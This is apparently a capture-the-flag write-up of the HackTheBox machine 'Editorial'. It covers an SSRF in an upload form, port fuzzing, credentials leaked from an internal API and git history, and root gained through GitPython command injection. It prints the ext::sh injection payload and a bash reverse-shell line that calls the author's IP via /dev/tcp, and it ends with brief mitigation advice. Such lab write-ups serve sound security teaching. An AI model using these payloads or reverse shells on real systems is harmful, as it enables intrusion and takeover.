---
title: "HackTheBox - Editorial"
author: Nasrallah
description: ""
date: 2024-10-27 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, ssrf, python, git]
img_path: /assets/img/hackthebox/machines/editorial
image:
    path: editorial.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Editorial](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/editorial) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ) start with SSRF that we exploit to find an internal service and get our first set of credentials. After we ssh we find another credentials in a .git repository. The new user can run a python script that uses a library vulnerable to RCE giving us a root shell.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.20
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports, 22 running ssh and 80 running nginx with the hostname `editorial.htb`, let's add that to our `/etc/hosts` file.

### Web

Let's navigate to the website.

![webpage](1.png)

Nothing really useful on the home page, let's check the other pages.

![upload](2.png)

On the `Publish with us`, we find an upload form.

Let's fill the form and submit it.

![form](3.png)

After submitting the form nothing really happened.

Going back we can see there is a `Preview` button. This time I selected an image file and clicked priview.

![preview](4.png)

We can see that the image changed to the one I uploaded.

Let's check the request on burp.

![burp](5.png)

We can see here a POST request to `/upload-cover`, and we get a path to the image in the response.

I tried uploading a reverse but it didn't get executed, this was a rabbit hole.

The next thing I tried is the URL form, I supplied my tun0 ip address and setup a listener.

![ssrf](6.png)

After sending the request I was able to get a connection on my listener. This mean the website is vulnerable to SSRF(Server Side Request Forgery).

### SSRF

Let's try enumerating local port to see if there are any other service running on the target.

First let's generate a list of ports:

```bash
seq 1 65535 > list.txt
```

Now we can use ffuf to bruteforce the port number.

First we save the request from burp to `file.req`.

```terminal
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Type: multipart/form-data; boundary=---------------------------11871288052085292363748330851
Priority: u=0
Content-Length: 363

-----------------------------11871288052085292363748330851

Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ/
-----------------------------11871288052085292363748330851
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------11871288052085292363748330851--

```

>You need to change the url to `http://127.0.0.1:FUZZ/`

Now we run the following command:

```bash
ffuf -c -u http://editorial.htb/upload-cover -X POST -request file.req -w list.txt -fs 61
```

```terminal
┌─[eu]─[10.10.16.8]─[sirius@parrot]─[~/CTF/HTB/editorial]
└──╼ [★]$ ffuf -c -u http://editorial.htb/upload-cover -X POST -request ssrf.req -w list.txt -fs 61

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /home/sirius/CTF/HTB/editorial/list.txt
 :: Header           : Host: editorial.htb
 :: Header           : Content-Type: multipart/form-data; boundary=---------------------------11871288052085292363748330851
 :: Header           : Priority: u=0
 :: Data             : -----------------------------11871288052085292363748330851
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ/
-----------------------------11871288052085292363748330851
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------11871288052085292363748330851--
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 61
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 1608ms]
```

We found port 5000.

Now we got back to burp and request `http://127.0.0.1:5000/`

![port5000](7.png)

Now we copy the `/static/uploads/23d8c597-8aad-46b4-bde8-9c0980fb96bb` and request it on another tab.

![info5000](8.png)

We got back some json data

```json
{
    "messages": [
        {
            "promotions": {
                "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
        "coupons": {
            "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
        "new_authors": {
            "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
        "platform_use": {
            "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
      {
          "changelog": {
              "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
        "latest": {
            "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

We can see example of requests of the api running on port 5000.

## **Foothold**

One api endpoint that seems interesting is the third one `new_authors`. Let's request it.

![api](9.png)

![authors](10.png)

We got the username `dev` and the password `dev080217_devAPI!@`, let's try ssh into the machine.

```terminal
└──╼ [★]$ ssh dev@editorial.htb
dev@editorial.htb's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
dev@editorial:~$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev)
```

## **Privilege Escalation**

Checking the home directory we find `apps` folder.

```terminal
dev@editorial:~$ ls
apps  user.txt
dev@editorial:~$ ls -la apps
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
```

The apps contains a `.git`, let's check the logs.

```terminal
dev@editorial:~/apps$ git log --oneline
8ad0f31 (HEAD -> master) fix: bugfix in api port endpoint
dfef9f2 change: remove debug and update api port
b73481b change(api): downgrading prod to dev
1e84a03 feat: create api to editorial info
3251ec9 feat: create editorial app
```

The commit `b73481b` has the description `downgrading prod to dev`, that's sound interesting, let's check the difference between it and the one's before it.

```terminal
dev@editorial:~/apps$ git diff b73481b 1e84a03
diff --git a/app_api/app.py b/app_api/app.py
index 3373b14..61b786f 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
```

We got another password for user `prod`. Let's switch users.

```terminal
dev@editorial:~/apps$ su prod
Password: 
prod@editorial:/home/dev/apps$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

After running sudo -l we see we can run a python script at root, let's see what's on that script.

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

The script takes arguments from the user and pass it to `r.clone_from` function from git library.

Searching on google for this function we find that it is vulnerable to RCE. <https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858>

Let's test the payload provided.

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/hack'
```

![payload](11.png)

We managed to execute commands successfully, now let's get a reverse shell.

First I'll write an bash rev shell to a file.

```bash
echo '/bin/bash -i >& /dev/tcp/10.10.16.8/9001 0>&1' > /tmp/shell.sh
```

Give the file execute permission, setup a listener then run the exploit command.

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
```

![shell](12.png)

We got a shell!

## **Prevention and Mitigation**

### Server Side Request Forgery

SSRF allows an attacker to manipulate a server into making requests to internal or external services on their behalf.

There should be an access restriction to internal resources to prevent any information disclosure.

### GitPython

The `GitPython` library is vulnerable to RCE due to improper user input validation, which makes it possible to inject a maliciously crafted payload to achieve command execution.

The solution is to upgrade to version 3.1.30 or higher.

## **References**

<https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
